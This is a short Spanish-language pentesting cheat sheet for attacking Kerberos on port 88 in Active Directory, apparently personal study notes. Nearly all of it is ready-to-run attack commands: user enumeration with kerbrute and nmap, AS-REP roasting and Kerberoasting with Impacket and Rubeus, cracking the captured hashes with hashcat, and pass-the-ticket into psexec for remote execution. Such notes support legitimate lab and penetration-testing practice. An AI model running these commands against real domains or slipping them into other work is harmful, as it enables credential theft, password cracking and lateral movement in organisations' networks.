---
tags: [ports, kerberos, ad]
status: done
---

# 88 — Kerberos

> Para usar Kerberos y sus tickets: siempre FQDN, nunca IPs.

---

## Enumeración de Usuarios

```bash
# Kerbrute — user enumeration sin autenticación
kerbrute userenum -d dominio.com --dc <DC_IP> /usr/share/seclists/Usernames/Names/names.txt
kerbrute userenum --dc dc.dominio.com -d dominio.com /usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Nmap
nmap <DC> -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='dominio.com',userdb=wordlist.txt
```

---

## AS-REP Roasting (sin autenticación)

```bash
# Impacket
impacket-GetNPUsers dominio.com/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast

# Rubeus (con acceso a Windows)
.\Rubeus.exe asreproast /format:hashcat /nowrap
```

---

## Kerberoasting (con credenciales)

```bash
# Impacket
impacket-GetUserSPNs -request -dc-ip <DC_IP> dominio.com/usuario:contraseña

# Crackear
hashcat -m 13100 hashes.kerberoast rockyou.txt
```

---

## Pass The Ticket

```bash
# Importar ticket .ccache (Linux)
export KRB5CCNAME=/ruta/ticket.ccache
impacket-psexec -k -no-pass dominio.com/usuario@objetivo

# Importar .kirbi (Windows)
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

